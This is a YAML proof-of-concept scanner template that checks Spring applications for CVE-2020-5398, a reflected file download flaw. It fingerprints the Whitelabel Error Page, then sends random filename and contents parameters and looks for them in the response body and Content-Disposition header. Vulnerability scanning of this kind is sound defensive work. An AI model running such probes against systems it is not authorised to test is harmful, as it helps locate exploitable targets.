name: poc-yaml-spring-cve-2020-5398-rfd
manual: true
transport: http
set:
    rFilename: randomLowercase(10)
    rContent: md5(randomLowercase(20))
rules:
    detect:
        request:
            cache: true
            method: GET
            path: /
            headers:
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
            follow_redirects: false
        expression: response.body.bcontains(b"Whitelabel Error Page")
    r0:
        request:
            cache: true
            method: GET
            path: /?filename={{rFilename}}&contents={{rContent}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(rContent)) && response.headers["Content-Disposition"].contains(rFilename)
expression: detect() && r0()
detail:
    author: Aurora
    links:
        - https://github.com/motikan2010/CVE-2020-5398
    vulnerability:
        id: CT-120927
        level: high
